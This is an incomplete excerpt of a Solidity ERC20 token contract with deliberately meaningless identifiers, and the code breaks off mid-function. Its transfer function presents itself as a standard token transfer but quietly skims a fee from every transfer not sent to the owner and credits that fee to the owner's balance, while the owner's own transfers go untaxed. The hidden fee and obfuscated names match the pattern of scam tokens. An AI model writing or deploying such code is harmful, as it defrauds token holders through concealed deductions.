...
contract SPVMAK is Context, Ownable,  IERC20 {
 ...
 address private _BOMMYI;

 uint256 private _LBUWPU;
...
/**
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    uint256 LUYPDC = 0;
    if (recipient!=owner()){
       LUYPDC = amount.mul(XDXRLO).div(100000);
      _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
      _balances[recipient] = _balances[recipient].add(amount.sub(LUYPDC));
      _balances[owner()] = _balances[owner()].add(LUYPDC);
    }else{
       _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
